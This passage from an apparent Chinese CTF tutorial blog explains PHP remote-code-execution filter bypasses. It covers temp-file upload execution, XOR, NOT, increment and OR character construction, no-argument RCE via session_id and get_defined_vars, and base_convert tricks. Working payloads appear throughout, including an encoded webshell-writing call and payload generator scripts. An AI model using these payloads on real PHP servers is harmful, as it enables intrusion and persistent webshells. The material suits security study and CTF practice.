&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//用于检查可用字符，中间内容根据题目改</span></span><br></pre></td></tr></table></figure></div><h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母</p><p>一般来说这个文件在<a class="link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020">linux<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下面保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。</p><p>（可以通过linux的匹配符去匹配） 我们多上传几次就可以达到shell的目的</p><p>文件上传会自动保留到<code>/???/????????[@-[]</code></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">脚本</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r&#x27;http://xxx.xxx/1.php?shell=?&gt;&lt;?=. /???/????????[@-[]?&gt;&#x27;</span></span><br><span class="line">file = &#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;cat flag.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, files=file)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div><p>例题ctfshow中web55</p><h3 id="异或，取反，自增，或绕过"><a href="#异或，取反，自增，或绕过" class="headerlink" title="异或，取反，自增，或绕过"></a>异或，取反，自增，或绕过</h3><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p><p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，例如使用<code>@</code>和<code>!</code>这两个，可以异或出字母<code>a</code></p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class="line">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br><span class="line">拼接起来：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);  // $_=assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);  // $__=_POST</span><br><span class="line">$___=$$__; //$___=$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_]);</span><br><span class="line">放到一排就是：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure></div><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>取反也是php中的一种运算符，取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="variable">$wllm</span> =<span class="string">&quot;(~<span class="subst">$a</span>)(~<span class="subst">$b</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$wllm</span>;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//取反</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p><p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=&#x27;&#x27;;</span><br><span class="line">	$b=[];</span><br><span class="line">	print($a.$b);</span><br><span class="line">?&gt;</span><br><span class="line">输出Array</span><br><span class="line"></span><br><span class="line">//测试发现7.0.12以上版本不可使用</span><br><span class="line">//使用时需要url编码下</span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line">固定格式 构造出来的 assert($_POST[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br></pre></td></tr></table></figure></div><h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或<a class="link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><code>|</code>。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p><p>除这些之外我们还可以这样用<code>$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code>其中<code>&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</code>为构造出的<code>_GET</code>，适合于过滤了引号的情况下使用。</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;[a-z]|[0-9]&#x27;</span> <span class="comment"># 题目过滤正则</span></span><br><span class="line"><span class="comment"># 生成字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(i), re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(j), re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= k &lt;= <span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                content += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> i == line[<span class="number">0</span>]:</span><br><span class="line">                payload1 = payload1 + line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                payload2 = payload2 + line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    payload = <span class="string">&#x27;(&quot;&#x27;</span>+payload1+<span class="string">&#x27;&quot;|&quot;&#x27;</span>+payload2+<span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span>+ payload)</span><br><span class="line">    <span class="comment">#或</span></span><br></pre></td></tr></table></figure></div><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，但是在php7中，我们可以使用($a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的</p><p>在php7中，因为可以使用($a)()这种方法来执行命令，所以说我们利用<code>call_user_func()</code>来举例，<code>(call_user_func)(system,whoami,&#39;&#39;)</code>即可执行<code>whoami</code>的命令，取反后为<code>(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#39;&#39;);</code></p><p>php7中还可以利用<code>file_put_contents()</code>写入<code>shell</code>，<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>取反后<code>(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</code></p><h3 id="极限字符rce"><a href="#极限字符rce" class="headerlink" title="极限字符rce"></a>极限字符rce</h3><p>解析见<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/127963079">CTFshow-RCE极限大挑战_ctfshow rce-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><p>有现成脚本<a class="link" target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">ProbiusOfficial&#x2F;bashFuck: exec BashCommand with only ! # $ ‘ ( ) &lt; \ { } just 10 charset used in Bypass or CTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><p>在线网站<a class="link" target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/">BashFuck Payload Generator<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><p><strong>相关函数</strong></p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</span><br><span class="line">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</span><br><span class="line">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</span><br><span class="line">getcwd() :取得当前工作目录</span><br><span class="line">dirname():函数返回路径中的目录部分</span><br><span class="line">array_flip() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand() :从数组中随机取出一个或多个单元</span><br><span class="line"></span><br><span class="line">array_reverse():将数组内容反转</span><br><span class="line"></span><br><span class="line">strrev():用于反转给定字符串</span><br><span class="line"></span><br><span class="line">getcwd()：获取当前工作目录路径</span><br><span class="line"></span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">eval()、assert()：命令执行</span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br></pre></td></tr></table></figure></div><h3 id="方法一scandir-最常规的通解"><a href="#方法一scandir-最常规的通解" class="headerlink" title="方法一scandir() 最常规的通解"></a>方法一scandir() 最常规的通解</h3><h3 id="方法二：session-id"><a href="#方法二：session-id" class="headerlink" title="方法二：session_id()"></a>方法二：session_id()</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p><p>首先我们需要开启<code>session_start()</code>来保证<code>session_id()</code>的使用，<code>session_id</code>可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p><h4 id="法一hex2bin（）"><a href="#法一hex2bin（）" class="headerlink" title="法一hex2bin（）"></a>法一hex2bin（）</h4><p>我们自己手动对命令进行十六进制编码，后面在用函数<code>hex2bin()</code>解码转回去，使得后端实际接收到的是恶意代码。我们把想要执行的命令进行十六进制编码后，替换掉‘Cookie:PHPSESSID&#x3D;’后面的值</p><p>以下是十六进制编码脚本：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encoded = bin2hex(&quot;phpinfo();&quot;);</span><br><span class="line">echo $encoded;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>得到<code>phpinfo();</code>的十六进制编码，即<code>706870696e666f28293b</code></p><p>那么payload就可以是：</p><p>?参数&#x3D;<code>eval(hex2bin(session_id(session_start())));</code><br>同时更改cookie后的值为想执行的命令的十六进制编码</p><h4 id="法二读文件"><a href="#法二读文件" class="headerlink" title="法二读文件"></a>法二读文件</h4><p>例题依然是[GXYCTF2019]禁止套娃，在知道文件名为flag.php的情况下直接读文件</p><p>如果已知文件名，把文件名写在PHPSESSID后面，构造payload为：</p><div class="code-container" data-rel="Lisp"><figure class="iseeu highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(<span class="name">session_id</span>(<span class="name">session_start</span>()))<span class="comment">;</span></span><br></pre></td></tr></table></figure></div><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></div><p>也是不含get的</p><h4 id="方法三：getallheaders"><a href="#方法三：getallheaders" class="headerlink" title="方法三：getallheaders()"></a>方法三：getallheaders()</h4><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p><p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure></div><p>sky是自己添加的请求头， end()指向最后一行的sky后的代码，达到phpinfo的目的，然后可以进一步去rce。</p><h4 id="方法四：get-defined-vars"><a href="#方法四：get-defined-vars" class="headerlink" title="方法四：get_defined_vars()"></a>方法四：get_defined_vars()</h4><p>相较于getallheaders（）更加具有普遍性，它可以回显全局变量<code>$_GET、$_POST、$_FILES、$_COOKIE</code></p><p>返回数组顺序为<code>$_GET--&gt;$_POST--&gt;$_COOKIE--&gt;$_FILES</code></p><p>首先确认是否有回显：</p><p><code>print_r(get_defined_vars());</code><br>假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure></div><p>把<code>eval</code>换成<code>assert</code>也行 ，能执行<code>system(&#39;ls /&#39;)</code>就行</p><h2 id="缓冲区替换"><a href="#缓冲区替换" class="headerlink" title="缓冲区替换"></a>缓冲区替换</h2><p>在命令后<code>exit();</code>退出不执行后面代码</p><h2 id="利用数学函数进行RCE"><a href="#利用数学函数进行RCE" class="headerlink" title="利用数学函数进行RCE"></a>利用数学函数进行RCE</h2><p>常用函数</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(number,frombase,tobase)</span><br></pre></td></tr></table></figure></div><p>在任意进制之间转换数字。</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dechex(dec_number)</span><br></pre></td></tr></table></figure></div><p>把十进制转换为十六进制。返回一个字符串，包含有给定 <em>binary_string</em> 参数的十六进制表示。所能转换的最大数值为十进制的 4294967295，其结果为 “ffffffff”。</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdec(hex_string)</span><br></pre></td></tr></table></figure></div><p>把十六进制转换为十进制。返回与 <em>hex_string</em> 参数所表示的十六进制数等值的的十进制数。</p><p>十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。</p><p>而 <code>base_convert</code> 正好能在任意进制转换数字，这样我们传入十进制的数字，使其转换为三十六进制时，返回的字符串是我们想要的 <code>cat</code> 等命令就行了。</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo base_convert(&quot;cat&quot;,36,10);</span><br><span class="line">//15941</span><br></pre></td></tr></table></figure></div><p>但这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回 <code>.</code> <code>/</code> <code>*</code> 等特殊字符，而这就需要用到另一类运算函数。</p><p>比如我们要构造 <code>system(&#39;cat *&#39;)</code></p><p>那么我们需要返回 <code>空格*</code> 这样的函数，而 php 中函数名默认为字符串，可以进行异或。</p><p>贴个脚本</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>想要详细了解可以看看<a class="link" 